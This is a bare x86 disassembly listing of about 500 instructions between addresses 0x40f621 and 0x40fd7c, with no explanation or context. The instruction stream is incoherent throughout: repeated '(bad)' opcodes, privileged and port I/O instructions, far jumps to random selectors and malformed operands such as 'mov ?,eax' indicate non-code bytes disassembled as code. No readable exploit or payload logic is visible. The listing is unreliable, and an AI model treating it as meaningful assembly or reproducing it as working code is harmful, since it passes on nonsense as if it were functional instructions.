  40f621:	rcl    BYTE PTR [eax+ecx*1],0x19
  40f625:	(bad)  
  40f627:	inc    ecx
  40f628:	fnstsw WORD PTR [ebx]
  40f62a:	and    ecx,ebx
  40f62c:	jle    0x40f679
  40f62e:	mov    ds:0x67b6de3b,al
  40f633:	sbb    bh,BYTE PTR [eax]
  40f635:	fist   WORD PTR [ebp-0x71]
  40f638:	sub    BYTE PTR [edi-0x48c7e72b],al
  40f63e:	and    eax,esp
  40f640:	or     al,0x89
  40f642:	lds    ecx,FWORD PTR [eiz*2-0x5f18b43f]
  40f649:	(bad)  
  40f64b:	icebp  
  40f64c:	inc    ebx
  40f64d:	and    BYTE PTR [ebx],dh
  40f64f:	cmp    BYTE PTR ds:0x705f6f2c,dl
  40f655:	add    dh,BYTE PTR [edi-0x6d14a189]
  40f65b:	adc    eax,0x2cb202e7
  40f660:	fnstcw WORD PTR [ebx]
  40f662:	and    BYTE PTR [ecx+edx*8],bh
  40f665:	call   DWORD PTR [ebp-0x1a]
  40f668:	aam    0x78
  40f66a:	xor    al,0x22
  40f66c:	lods   eax,DWORD PTR ds:[esi]
  40f66d:	test   cl,dh
  40f66f:	mov    al,ds:0xf6a78537
  40f674:	xlat   BYTE PTR ds:[ebx]
  40f675:	add    DWORD PTR [ebp+edi*1-0x26],0x7b
  40f67a:	(bad)  
  40f67e:	mov    ebx,0x220d30d9
  40f683:	loopne 0x40f622
  40f685:	hlt    
  40f686:	cli    
  40f687:	aaa    
  40f688:	jns    0x40f628
  40f68a:	mov    eax,0xb433b288
  40f68f:	ins    DWORD PTR es:[edi],dx
  40f690:	jl     0x40f705
  40f692:	ret    
  40f693:	sub    DWORD PTR [ebp+0x3f],0x18c9cb97
  40f69a:	xchg   al,al
  40f69c:	pusha  
  40f69d:	mov    al,ds:0xdbb1addd
  40f6a2:	into   
  40f6a3:	mov    edx,0x456876bd
  40f6a8:	xchg   edx,eax
  40f6a9:	call   0xfbad99b1
  40f6ae:	adc    BYTE PTR [esi],ch
  40f6b0:	inc    edx
  40f6b1:	clc    
  40f6b2:	adc    BYTE PTR [esp+edi*4],ch
  40f6b5:	mov    gs,WORD PTR [eax+0x5dfb0769]
  40f6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6bc:	adc    al,0xee
  40f6be:	and    DWORD PTR [eax+0x7b3eb780],ebp
  40f6c4:	nop
  40f6c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6c6:	jns    0x40f688
  40f6c8:	jb     0x40f732
  40f6ca:	and    al,0x69
  40f6cc:	push   ebp
  40f6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ce:	fsubr  DWORD PTR [eax-0x33cde84f]
  40f6d4:	pop    esi
  40f6d5:	rol    DWORD PTR [ebx-0x47d274f3],cl
  40f6db:	cmp    dl,BYTE PTR [edi-0x52]
  40f6de:	mov    edi,0x10c4db11
  40f6e3:	retf   
  40f6e4:	stos   BYTE PTR es:[edi],al
  40f6e5:	sbb    al,BYTE PTR [eax-0x76b43c0b]
  40f6eb:	scas   al,BYTE PTR es:[edi]
  40f6ec:	(bad)  
  40f6ed:	lahf   
  40f6ee:	rcr    ebp,0x9d
  40f6f1:	mov    esi,0x8e47171
  40f6f6:	or     al,BYTE PTR [esi]
  40f6f8:	jnp    0x40f685
  40f6fa:	push   eax
  40f6fb:	mov    cs,eax
  40f6fd:	(bad)  [edi]
  40f6ff:	les    esi,FWORD PTR [eax+0x5d]
  40f702:	push   cs
  40f703:	pop    ebp
  40f704:	adc    BYTE PTR [edx+edx*8],0xa7
  40f708:	pop    ecx
  40f709:	les    eax,FWORD PTR [esi-0x80]
  40f70c:	imul   eax,DWORD PTR [ebx+0x2e],0x93b1a02d
  40f713:	jmp    0xe2d6:0x5fdad1c5
  40f71a:	sub    ch,BYTE PTR [edx]
  40f71c:	scas   al,BYTE PTR es:[edi]
  40f71d:	adc    ebp,DWORD PTR [edx-0x5f]
  40f720:	push   esi
  40f721:	jb     0x40f73d
  40f723:	sbb    eax,0x4f047b36
  40f728:	pop    edi
  40f729:	jno    0x40f76c
  40f72b:	sub    BYTE PTR [esi],0xa1
  40f72e:	int3   
  40f72f:	pop    ebp
  40f730:	sub    BYTE PTR [eax+ecx*1+0x2],al
  40f734:	ret    
  40f735:	mov    edi,0xb656caf3
  40f73a:	sub    ch,cl
  40f73c:	pop    ds
  40f73d:	in     al,dx
  40f73e:	repnz test BYTE PTR [edi+0x69ac4611],0x1
  40f746:	outs   dx,DWORD PTR ds:[esi]
  40f747:	call   0xf290:0xbe9fd1a9
  40f74e:	pushf  
  40f74f:	dec    esi
  40f750:	int    0xe0
  40f752:	mov    ?,eax
  40f754:	push   edx
  40f755:	std    
  40f756:	push   ebx
  40f757:	xchg   edi,eax
  40f758:	sbb    eax,0x6106d128
  40f75d:	fwait
  40f75e:	cwde   
  40f75f:	ins    BYTE PTR es:[edi],dx
  40f760:	sar    BYTE PTR [ebx+edx*1],0xad
  40f764:	fldenv [ebx+0x16]
  40f767:	lea    esp,[ebx]
  40f769:	out    0x92,al
  40f76b:	inc    ebp
  40f76c:	sti    
  40f76d:	rcr    DWORD PTR [edi-0x3172ec57],0x64
  40f774:	cmp    ch,cl
  40f776:	dec    ebx
  40f777:	(bad)  
  40f778:	cmp    al,0xcc
  40f77a:	cmp    eax,0x16e7a842
  40f77f:	aaa    
  40f780:	fisttp WORD PTR [edi]
  40f782:	mov    ds:0xadb6be52,eax
  40f787:	cs scas eax,DWORD PTR es:[edi]
  40f789:	and    BYTE PTR [eax+0x2ab7f7cc],al
  40f78f:	xchg   bh,bl
  40f791:	inc    esi
  40f792:	or     eax,0x906aacce
  40f797:	mov    bl,0x7f
  40f799:	lock inc esp
  40f79b:	jg     0x40f804
  40f79d:	ror    DWORD PTR [edx],0x8e
  40f7a0:	xor    BYTE PTR [ebp-0x43],bh
  40f7a3:	loopne 0x40f76a
  40f7a5:	test   DWORD PTR [edx+0x14483e19],ebp
  40f7ab:	sbb    dl,bh
  40f7ad:	sbb    bh,BYTE PTR [ebp+0x30]
  40f7b0:	(bad)  
  40f7b1:	sbb    BYTE PTR [esi],cl
  40f7b3:	inc    edx
  40f7b4:	jno    0x40f7fa
  40f7b6:	push   ds
  40f7b7:	hlt    
  40f7b8:	ja     0x40f7c7
  40f7ba:	div    DWORD PTR [eax]
  40f7bc:	and    DWORD PTR [edi],esi
  40f7be:	jbe    0x40f7da
  40f7c0:	or     DWORD PTR [ebp+0xf],0x5b21fd90
  40f7c7:	push   ss
  40f7c8:	inc    ebp
  40f7c9:	inc    cl
  40f7cb:	mov    edi,edx
  40f7cd:	mov    ah,0xea
  40f7cf:	loop   0x40f84a
  40f7d1:	into   
  40f7d2:	ror    DWORD PTR [ebx+0x2f],0x12
  40f7d6:	mov    BYTE PTR [ebp+0x1a],bh
  40f7d9:	add    al,0x1e
  40f7db:	cmc    
  40f7dc:	iret   
  40f7dd:	jecxz  0x40f762
  40f7df:	push   ss
  40f7e0:	pop    ebx
  40f7e1:	cwde   
  40f7e2:	push   esp
  40f7e3:	mov    ds:0xcd879a22,al
  40f7e8:	bound  edx,QWORD PTR [eax-0x4e]
  40f7eb:	or     eax,0x79249625
  40f7f0:	imul   ecx,DWORD PTR [edx],0x4d99c8d9
  40f7f6:	int3   
  40f7f7:	fstp   DWORD PTR [ebx+0x6148d400]
  40f7fd:	into   
  40f7fe:	push   esi
  40f7ff:	mov    edx,0x93a582af
  40f804:	jo     0x40f7f2
  40f806:	push   ecx
  40f807:	add    DWORD PTR [edi],0xed54be0a
  40f80d:	in     eax,0x85
  40f80f:	retf   0x6986
  40f812:	sub    DWORD PTR [edx],0xffffffb9
  40f815:	inc    ecx
  40f816:	sub    ebp,DWORD PTR [esi+ecx*4]
  40f819:	mov    al,ds:0x4838c3c5
  40f81e:	or     eax,0xe408d8b2
  40f823:	fist   DWORD PTR [edx-0x17]
  40f826:	or     ecx,DWORD PTR [ebp+0x4637bd29]
  40f82c:	xchg   esi,eax
  40f82d:	xchg   ebp,eax
  40f82e:	jle    0x40f89e
  40f830:	push   es
  40f831:	inc    ebx
  40f832:	mov    esp,0x2d33dcfa
  40f837:	lahf   
  40f838:	push   0x2fbc560d
  40f83d:	dec    eax
  40f83e:	mov    ebp,0x65bde479
  40f843:	rol    DWORD PTR [edx-0x408b38f5],1
  40f849:	inc    ebx
  40f84a:	xor    bl,BYTE PTR [edi]
  40f84c:	pop    edi
  40f84d:	add    al,0xef
  40f84f:	and    DWORD PTR [edx],edx
  40f851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f852:	mov    eax,0x62dba253
  40f857:	and    al,0x24
  40f859:	sbb    bh,BYTE PTR [edx+ecx*4-0xf0dd252]
  40f860:	test   DWORD PTR [ecx],0xe63796cd
  40f866:	add    eax,ebp
  40f868:	repnz add esp,DWORD PTR [ebx-0x1cadfe48]
  40f86f:	mov    esp,DWORD PTR [edi-0x61]
  40f872:	das    
  40f873:	repz call 0x3b21:0x274c995
  40f87b:	inc    edx
  40f87c:	mov    eax,0x260354d6
  40f881:	ss leave 
  40f883:	das    
  40f884:	or     edx,DWORD PTR [edx+0x6f]
  40f887:	jmp    0xf1e2b54b
  40f88c:	mov    ebp,eax
  40f88e:	stos   DWORD PTR es:[edi],eax
  40f88f:	pextrw edi,(bad),0xc5
  40f891:	mov    ebx,0xd65110f7
  40f896:	mov    BYTE PTR [edx+0x4cfebe34],dh
  40f89c:	lea    edx,[ecx+0x12]
  40f89f:	retf   0x6e0b
  40f8a2:	(bad)  
  40f8a3:	cli    
  40f8a4:	mov    eax,ds:0xd540c52c
  40f8a9:	sub    ebp,ebx
  40f8ab:	dec    DWORD PTR [ecx]
  40f8ad:	jl     0x40f83f
  40f8af:	aas    
  40f8b0:	cmp    bh,bl
  40f8b2:	out    dx,al
  40f8b3:	dec    eax
  40f8b4:	pop    edx
  40f8b5:	shr    DWORD PTR [edx],0x3d
  40f8b8:	out    dx,eax
  40f8b9:	mov    ebp,0xce9a06ca
  40f8be:	adc    BYTE PTR [edi-0x428a1ec2],0xf
  40f8c5:	int3   
  40f8c6:	stos   BYTE PTR es:[edi],al
  40f8c7:	imul   edi,DWORD PTR [esi+0x4b],0x7a26ddb2
  40f8ce:	sbb    BYTE PTR [edx+0x1b],cl
  40f8d1:	dec    ebx
  40f8d2:	pop    ecx
  40f8d3:	push   edx
  40f8d4:	push   edx
  40f8d5:	and    BYTE PTR [esi],ah
  40f8d7:	or     DWORD PTR [edx],eax
  40f8d9:	inc    ecx
  40f8da:	loopne 0x40f8fb
  40f8dc:	fimul  DWORD PTR [eax-0x59608a85]
  40f8e2:	mov    edx,0xd49e0c48
  40f8e7:	test   ecx,0x17bd14d2
  40f8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ee:	call   0x54e7eb74
  40f8f3:	stc    
  40f8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f5:	mov    ds:0x2e00eabb,al
  40f8fa:	pop    es
  40f8fb:	pop    ecx
  40f8fc:	ret    
  40f8fd:	pop    ebp
  40f8fe:	xor    eax,0xa2f86a40
  40f903:	jp     0x40f914
  40f905:	sbb    ah,ah
  40f907:	xor    DWORD PTR [eax-0x59],eax
  40f90a:	cmp    dh,BYTE PTR [ecx+0x39ac4914]
  40f910:	jne    0x40f904
  40f912:	sbb    ah,BYTE PTR [edi-0x33]
  40f915:	pop    edx
  40f916:	push   esp
  40f917:	loop   0x40f98b
  40f919:	sub    ch,BYTE PTR [edx]
  40f91b:	and    BYTE PTR [ebx],dl
  40f91d:	xchg   edi,eax
  40f91e:	in     eax,dx
  40f91f:	cli    
  40f920:	aaa    
  40f921:	inc    ecx
  40f922:	ins    BYTE PTR es:[edi],dx
  40f923:	je     0x40f936
  40f925:	fsubr  QWORD PTR [esi]
  40f927:	mov    edx,0xef1db09c
  40f92c:	push   edi
  40f92d:	fild   WORD PTR [esp+ebp*4-0x64]
  40f931:	lahf   
  40f932:	xchg   ecx,esp
  40f934:	aas    
  40f935:	push   ebx
  40f936:	or     BYTE PTR [edi+0x2ed6e4e9],ah
  40f93c:	sub    eax,0xd9a91f24
  40f941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f942:	adc    bh,dl
  40f944:	pop    ds
  40f945:	push   0xffffffc1
  40f947:	or     DWORD PTR [eax-0x198a4ef5],ebx
  40f94d:	sahf   
  40f94e:	(bad)  
  40f94f:	imul   eax,eax,0xedb41087
  40f955:	pop    esp
  40f956:	sub    DWORD PTR [ebx],ebp
  40f958:	push   ds
  40f959:	(bad)  
  40f95b:	lods   eax,DWORD PTR ds:[esi]
  40f95c:	call   0xff0eab6f
  40f961:	js     0x40f927
  40f963:	(bad)  
  40f964:	cli    
  40f965:	js     0x40f996
  40f967:	mov    ch,0xa1
  40f969:	fsqrt  
  40f96b:	pop    ebx
  40f96c:	mov    bh,0x81
  40f96e:	out    dx,eax
  40f96f:	pop    ebx
  40f970:	cmp    dl,BYTE PTR [edx-0x25dda837]
  40f976:	push   edi
  40f977:	shr    BYTE PTR es:[ebx+0x2c],cl
  40f97b:	dec    ebx
  40f97c:	je     0x40f97f
  40f97e:	(bad)
  40f982:	retf   
  40f983:	fdivr  DWORD PTR [esi+eax*2]
  40f986:	test   eax,0x6c44a928
  40f98b:	jp     0x40f9e1
  40f98d:	mov    al,0xad
  40f98f:	add    eax,0xb4662993
  40f994:	push   ecx
  40f995:	mov    ds:0x94d970c6,eax
  40f99a:	cmp    DWORD PTR [esp+0x4c],ebp
  40f99e:	xchg   edx,eax
  40f99f:	adc    al,0xee
  40f9a1:	xlat   BYTE PTR ds:[ebx]
  40f9a2:	inc    edx
  40f9a3:	mov    esi,0x8958b0de
  40f9a8:	fstp   TBYTE PTR [ebx]
  40f9aa:	(bad)  
  40f9ab:	mov    eax,0x173d46c0
  40f9b0:	sbb    DWORD PTR [ebx],ebp
  40f9b2:	mov    edi,0x25379f65
  40f9b7:	daa    
  40f9b8:	shl    DWORD PTR [ecx],cl
  40f9ba:	cmp    bl,BYTE PTR [eax+0x6]
  40f9bd:	scas   eax,DWORD PTR es:[edi]
  40f9be:	push   eax
  40f9bf:	cwde   
  40f9c0:	xchg   esi,eax
  40f9c1:	stc    
  40f9c2:	dec    edi
  40f9c3:	sbb    DWORD PTR [edi-0x6b],ecx
  40f9c6:	out    dx,eax
  40f9c7:	cdq    
  40f9c8:	sub    eax,0x180a0ef0
  40f9cd:	push   esi
  40f9ce:	fs adc eax,0x8092e9cc
  40f9d4:	imul   esi,esi,0xe5265fd3
  40f9da:	mov    ah,0xeb
  40f9dc:	ss mov ebx,0x6b492719
  40f9e2:	cld    
  40f9e3:	icebp  
  40f9e4:	lock jae 0x40fa0f
  40f9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e8:	scas   al,BYTE PTR es:[edi]
  40f9e9:	rol    DWORD PTR [ecx-0x6b],0x7f
  40f9ed:	clc    
  40f9ee:	push   edi
  40f9ef:	shl    ebp,cl
  40f9f1:	in     eax,dx
  40f9f2:	fwait
  40f9f3:	nop
  40f9f4:	sbb    BYTE PTR [edi+0x34d0102a],bh
  40f9fa:	jne    0x40f9d6
  40f9fc:	test   eax,0xe8812913
  40fa01:	pusha  
  40fa02:	dec    edx
  40fa03:	outs   dx,BYTE PTR ds:[esi]
  40fa04:	adc    al,0xd5
  40fa06:	ss inc esi
  40fa08:	xchg   DWORD PTR [ebx],esi
  40fa0a:	mov    ds:0x13619d77,al
  40fa0f:	or     ebx,ecx
  40fa11:	lods   eax,DWORD PTR ds:[esi]
  40fa12:	in     eax,0x6c
  40fa14:	dec    edx
  40fa15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa16:	inc    eax
  40fa17:	sti    
  40fa18:	jne    0x40fa0b
  40fa1a:	mov    esp,0xbb09b872
  40fa1f:	adc    esi,eax
  40fa21:	outs   dx,DWORD PTR ds:[esi]
  40fa22:	(bad)  
  40fa23:	pushf  
  40fa24:	inc    ebp
  40fa25:	clc    
  40fa26:	dec    ebp
  40fa27:	dec    ebp
  40fa28:	mov    al,0x8b
  40fa2a:	repz sahf 
  40fa2c:	push   ecx
  40fa2d:	stos   DWORD PTR es:[edi],eax
  40fa2e:	mov    ds:0x740c5057,eax
  40fa33:	imul   ebx,DWORD PTR [esp+ebp*2-0x19],0xffffffbe
  40fa38:	scas   eax,DWORD PTR es:[edi]
  40fa39:	sub    DWORD PTR [eax+0x30caaacd],edi
  40fa3f:	outs   dx,DWORD PTR ds:[esi]
  40fa40:	push   esi
  40fa41:	mov    bl,al
  40fa43:	(bad)  
  40fa45:	imul   ebx,DWORD PTR [edx+0x6a],0x44
  40fa49:	sbb    esi,ebp
  40fa4b:	inc    eax
  40fa4c:	add    BYTE PTR [edi-0xa],0x1a
  40fa50:	aas    
  40fa51:	in     al,dx
  40fa52:	fisttp WORD PTR [ecx]
  40fa54:	in     al,dx
  40fa55:	aad    0x43
  40fa57:	xchg   esp,eax
  40fa58:	mov    esp,0xb3a467d9
  40fa5d:	sub    eax,0x65cf7275
  40fa62:	jmp    0x40f9fd
  40fa64:	loopne 0x40fae0
  40fa66:	jns    0x40fa51
  40fa68:	cmc    
  40fa69:	mov    gs,WORD PTR [edx]
  40fa6b:	rcr    DWORD PTR [esi+0x76],1
  40fa6e:	pop    es
  40fa6f:	jns    0x40fa43
  40fa71:	call   0x42331b08
  40fa76:	add    dl,BYTE PTR [esi-0x5c]
  40fa79:	xor    eax,0xd8e1baae
  40fa7e:	sar    BYTE PTR [ebp+0x33811a0f],0xa7
  40fa85:	test   BYTE PTR [edx-0x4eac1ac],cl
  40fa8b:	mov    eax,0x5739585a
  40fa90:	cmp    eax,0x5c9c3faa
  40fa95:	push   ecx
  40fa96:	cmp    eax,0x2ccb6fa5
  40fa9b:	xor    DWORD PTR [ecx-0x6c],esp
  40fa9e:	call   0x4fa4:0x411dbe58
  40faa5:	in     al,0xdd
  40faa7:	loop   0x40fa3e
  40faa9:	das    
  40faaa:	retf   
  40faab:	(bad)  
  40faac:	cli    
  40faad:	es and eax,0x81db0f27
  40fab3:	fisttp WORD PTR [ecx]
  40fab5:	xor    eax,0x130f0973
  40faba:	cmp    ch,ch
  40fabc:	cs je  0x40fa5b
  40fabf:	fwait
  40fac0:	xchg   BYTE PTR [eax-0xc600069],cl
  40fac6:	cmp    al,0x2a
  40fac8:	and    DWORD PTR [ecx],0x1c
  40facb:	cmp    ebx,DWORD PTR [ebx-0x4a9f7d96]
  40fad1:	je     0x40fae8
  40fad3:	dec    eax
  40fad4:	mov    al,0xab
  40fad6:	out    dx,al
  40fad7:	in     al,dx
  40fad8:	sbb    bh,BYTE PTR [ebx]
  40fada:	push   ds
  40fadb:	xor    edx,DWORD PTR [edx-0x1e48edf]
  40fae1:	in     al,0x4
  40fae3:	fimul  DWORD PTR [edx]
  40fae5:	test   eax,0xeb30b4e4
  40faea:	xchg   esp,eax
  40faeb:	or     al,0x14
  40faed:	pop    edi
  40faee:	in     al,dx
  40faef:	or     al,0x36
  40faf1:	mov    dh,0x7c
  40faf3:	sbb    al,0x4b
  40faf5:	out    dx,eax
  40faf6:	sahf   
  40faf7:	adc    ecx,0x92437aa
  40fafd:	out    0xca,al
  40faff:	push   ebx
  40fb00:	and    eax,0x29839d0c
  40fb05:	scas   al,BYTE PTR es:[edi]
  40fb06:	mov    ?,WORD PTR [ebp-0x7c]
  40fb09:	jbe    0x40fac3
  40fb0b:	cmc    
  40fb0c:	adc    dl,BYTE PTR [edi+0x2a69bed]
  40fb12:	shl    al,cl
  40fb14:	cs nop
  40fb16:	sbb    eax,0x66a2f0c3
  40fb1b:	pop    esp
  40fb1c:	jge    0x40fae8
  40fb1e:	call   0xf978b0be
  40fb23:	mov    ds:0x18968ea4,al
  40fb28:	jo     0x40fb48
  40fb2a:	repnz test BYTE PTR [esi+0x6b9e5528],bl
  40fb31:	ss or  bh,dh
  40fb34:	ret    
  40fb35:	gs mov edi,0xaca7a653
  40fb3b:	adc    eax,0xce914f90
  40fb40:	jbe    0x40fadc
  40fb42:	mov    ebx,0x604928d6
  40fb47:	iret   
  40fb48:	push   es
  40fb49:	and    BYTE PTR [esp+ecx*2-0x3d00f227],dh
  40fb50:	jnp    0x40faf3
  40fb52:	test   al,0x12
  40fb54:	pop    edx
  40fb55:	loopne 0x40fba3
  40fb57:	or     dh,BYTE PTR [edi-0x7a]
  40fb5a:	mov    DWORD PTR [edi+0x23],edx
  40fb5d:	daa    
  40fb5e:	mov    esp,0x46b10da1
  40fb63:	or     WORD PTR [ecx+0x73],di
  40fb67:	cmp    DWORD PTR [ecx],0xffffff9c
  40fb6a:	mov    gs,edi
  40fb6c:	inc    ebp
  40fb6d:	jmp    ebp
  40fb6f:	push   es
  40fb70:	pop    ebx
  40fb71:	call   0x4a61c00c
  40fb76:	outs   dx,BYTE PTR ds:[esi]
  40fb77:	pop    es
  40fb78:	sahf   
  40fb79:	sti    
  40fb7a:	or     eax,0xf51b0ca0
  40fb7f:	push   ds
  40fb80:	mov    ch,0xc
  40fb82:	popf   
  40fb83:	pushf  
  40fb84:	ror    BYTE PTR [ebx-0x4371303b],0xc4
  40fb8b:	mov    BYTE PTR [ecx+ecx*1-0x48],bl
  40fb8f:	and    eax,DWORD PTR [edi-0x7fed9b62]
  40fb95:	mov    WORD PTR [ebx],fs
  40fb97:	xor    ecx,DWORD PTR [ebp+0x54f079ef]
  40fb9d:	ret    
  40fb9e:	loop   0x40fb4f
  40fba0:	(bad)  
  40fba2:	mov    bh,0x4b
  40fba4:	aad    0xc8
  40fba6:	sbb    ecx,DWORD PTR [edi]
  40fba8:	fs jmp 0x40fc03
  40fbab:	ret    0xd33a
  40fbae:	mov    bh,BYTE PTR [edx+0x9261686]
  40fbb4:	lahf   
  40fbb5:	xor    al,0xb2
  40fbb7:	mov    dl,0x22
  40fbb9:	sbb    eax,0xf1c8a0d8
  40fbbe:	and    al,0x5d
  40fbc0:	scas   al,BYTE PTR es:[edi]
  40fbc1:	leave  
  40fbc2:	push   ecx
  40fbc3:	xor    bl,dl
  40fbc5:	out    0x48,al
  40fbc7:	pop    eax
  40fbc8:	pop    es
  40fbc9:	aaa    
  40fbca:	sub    DWORD PTR [edi+0x1a],eax
  40fbcd:	(bad)  
  40fbce:	(bad)  [ecx+ebx*4-0x4ce1b320]
  40fbd5:	clc    
  40fbd6:	add    edx,DWORD PTR [edx-0x7]
  40fbd9:	shl    DWORD PTR [edi+0x15e78242],0xe3
  40fbe0:	inc    ebx
  40fbe1:	push   ebp
  40fbe2:	iret   
  40fbe3:	push   0xf
  40fbe5:	out    0xd4,eax
  40fbe7:	sbb    eax,ebx
  40fbe9:	mov    DWORD PTR [esp+ecx*1],esp
  40fbec:	mov    dl,0xbb
  40fbee:	jecxz  0x40fc20
  40fbf0:	(bad)  
  40fbf1:	fwait
  40fbf2:	call   0x8794:0x6728af7e
  40fbf9:	test   eax,0xc41ab37c
  40fbfe:	imul   eax,DWORD PTR [eax],0x1200a57e
  40fc04:	call   0x92c67370
  40fc09:	mov    cl,0x6d
  40fc0b:	test   BYTE PTR [edi],ah
  40fc0d:	jecxz  0x40fc44
  40fc0f:	dec    ebp
  40fc10:	leave  
  40fc11:	pop    es
  40fc12:	pop    ss
  40fc13:	cli    
  40fc14:	pop    ds
  40fc15:	sbb    eax,0x12316dd2
  40fc1a:	int3   
  40fc1b:	addr16 add ebp,esi
  40fc1e:	repz aas 
  40fc20:	mov    cl,cl
  40fc22:	push   eax
  40fc23:	out    0x97,eax
  40fc25:	jb     0x40fc5c
  40fc27:	loope  0x40fc52
  40fc29:	pop    esi
  40fc2a:	icebp  
  40fc2b:	stos   DWORD PTR es:[edi],eax
  40fc2c:	cmp    DWORD PTR [ebp-0x51],0x40b2883e
  40fc33:	pop    ebp
  40fc34:	dec    esp
  40fc35:	scas   al,BYTE PTR es:[edi]
  40fc36:	cmp    BYTE PTR [ebx+0x7],0x49
  40fc3a:	jo     0x40fbc1
  40fc3c:	sub    eax,0x8fcd65fe
  40fc41:	add    BYTE PTR [ebx-0x3e69016a],0x5c
  40fc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc49:	cmp    cl,BYTE PTR ds:0xd6d6
  40fc4e:	inc    ebp
  40fc4f:	or     bh,ch
  40fc51:	pop    es
  40fc52:	inc    edx
  40fc53:	aaa    
  40fc54:	mov    eax,DWORD PTR [ebp-0x54c63071]
  40fc5a:	retf   0xc69e
  40fc5d:	pop    ebx
  40fc5e:	out    dx,eax
  40fc5f:	mov    DWORD PTR [ecx],ecx
  40fc61:	sbb    BYTE PTR [esi],bl
  40fc63:	push   cs
  40fc64:	add    al,0xfb
  40fc66:	and    dh,bh
  40fc68:	retf   0x8a25
  40fc6b:	and    BYTE PTR [edx-0x77],0xd0
  40fc6f:	out    0xca,eax
  40fc71:	pop    es
  40fc72:	cmp    DWORD PTR [edi],0x242ccf4
  40fc78:	outs   dx,DWORD PTR ds:[esi]
  40fc79:	add    ch,BYTE PTR [eax+0x51]
  40fc7c:	jo     0x40fc2a
  40fc7e:	cmp    DWORD PTR [edx-0x12],0x38
  40fc82:	jp     0x40fcfe
  40fc84:	fiadd  WORD PTR [ebp-0x8]
  40fc87:	es jge 0x40fcd2
  40fc8a:	imul   eax,eax,0x5b
  40fc8d:	xchg   ecx,eax
  40fc8e:	or     eax,0x67c4deb9
  40fc93:	pop    edi
  40fc94:	sbb    eax,0xbe2add98
  40fc99:	mov    edi,DWORD PTR [edx]
  40fc9b:	fs jns 0x40fc7a
  40fc9e:	sub    al,0x63
  40fca0:	lods   eax,DWORD PTR ds:[esi]
  40fca1:	mov    dh,0xd6
  40fca3:	xchg   edi,edx
  40fca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca6:	xor    eax,0x60472f79
  40fcab:	fwait
  40fcac:	loope  0x40fd28
  40fcae:	mov    bl,0x2a
  40fcb0:	loop   0x40fc57
  40fcb2:	mov    WORD PTR [eax],?
  40fcb4:	mov    ds:0xcdc13bf3,eax
  40fcb9:	jecxz  0x40fd1a
  40fcbb:	shl    BYTE PTR [esi-0x51ab1cc2],1
  40fcc1:	imul   esi,ebp,0x13
  40fcc4:	arpl   WORD PTR [eax-0x5d8ff4a1],si
  40fcca:	jge    0x40fd12
  40fccc:	int    0x6a
  40fcce:	icebp  
  40fccf:	inc    esi
  40fcd0:	mov    ebp,tr0
  40fcd3:	mov    al,0x5e
  40fcd5:	out    dx,al
  40fcd6:	popf   
  40fcd7:	test   edi,esp
  40fcd9:	scas   al,BYTE PTR es:[edi]
  40fcda:	inc    ebp
  40fcdb:	stos   BYTE PTR es:[di],al
  40fcdd:	outs   dx,BYTE PTR ds:[esi]
  40fcde:	push   ds
  40fcdf:	pop    ebx
  40fce0:	(bad)  
  40fce1:	and    cl,BYTE PTR [ebp-0x33]
  40fce4:	inc    esi
  40fce5:	cld    
  40fce6:	je     0x40fd2e
  40fce8:	mov    eax,ds:0x48ea1d9
  40fced:	in     eax,0x67
  40fcef:	lods   eax,DWORD PTR ds:[esi]
  40fcf0:	dec    ebx
  40fcf1:	xchg   esi,eax
  40fcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf3:	xchg   ecx,eax
  40fcf4:	cmp    al,0x5
  40fcf6:	ffree  st(1)
  40fcf8:	xlat   BYTE PTR ds:[ebx]
  40fcf9:	pusha  
  40fcfa:	adc    DWORD PTR [edx+0x20],0x39
  40fcfe:	push   ds
  40fcff:	pop    ebp
  40fd00:	mov    ah,ch
  40fd02:	cld    
  40fd03:	loop   0x40fd5f
  40fd05:	sub    ebx,ebx
  40fd07:	pusha  
  40fd08:	aas    
  40fd09:	pop    ds
  40fd0a:	neg    DWORD PTR [ecx-0x69]
  40fd0d:	fsub   st(4),st
  40fd0f:	inc    ecx
  40fd10:	pusha  
  40fd11:	test   DWORD PTR [edi+0x16],ecx
  40fd14:	mov    ebp,0x3e5c038d
  40fd19:	(bad)  
  40fd1a:	lahf   
  40fd1b:	push   0xffffffc3
  40fd1d:	call   DWORD PTR [edi+ebx*4-0x7b]
  40fd21:	mov    cl,0xff
  40fd23:	and    al,0x66
  40fd25:	(bad)  
  40fd26:	jge    0x40fd7d
  40fd28:	lock sub edx,eax
  40fd2b:	fmul   QWORD PTR [esi+ebx*4-0x80c7c0a]
  40fd32:	pop    ds
  40fd33:	dec    esi
  40fd34:	ins    BYTE PTR es:[edi],dx
  40fd35:	out    dx,al
  40fd36:	dec    esp
  40fd37:	aam    0x48
  40fd39:	jbe    0x40fd56
  40fd3b:	add    DWORD PTR [ebp+0x27],0xffffff8e
  40fd3f:	mov    ah,BYTE PTR [eax+0x6]
  40fd42:	mov    ds:0xb72a143a,eax
  40fd47:	push   0x5a
  40fd49:	jmp    0x40fdaf
  40fd4b:	bound  edi,QWORD PTR ds:0xdc7d3a99
  40fd51:	mov    ebx,ebx
  40fd53:	cmp    BYTE PTR [eax],cl
  40fd55:	mov    cs,WORD PTR [eax+0x48]
  40fd58:	xor    bh,BYTE PTR [esi]
  40fd5a:	mov    eax,ds:0xdc4d65ca
  40fd5f:	adc    al,0x1f
  40fd61:	(bad)  
  40fd62:	add    BYTE PTR ds:[ecx],ah
  40fd65:	add    edi,esp
  40fd67:	in     eax,dx
  40fd68:	pop    ds
  40fd69:	(bad)  
  40fd6a:	cmp    eax,0x24f60516
  40fd6f:	mov    dl,0x32
  40fd71:	push   esp
  40fd72:	(bad)  
  40fd73:	in     al,0x44
  40fd75:	jmp    0xb1f4:0x7c41f991
  40fd7c:	retf   0xedd7
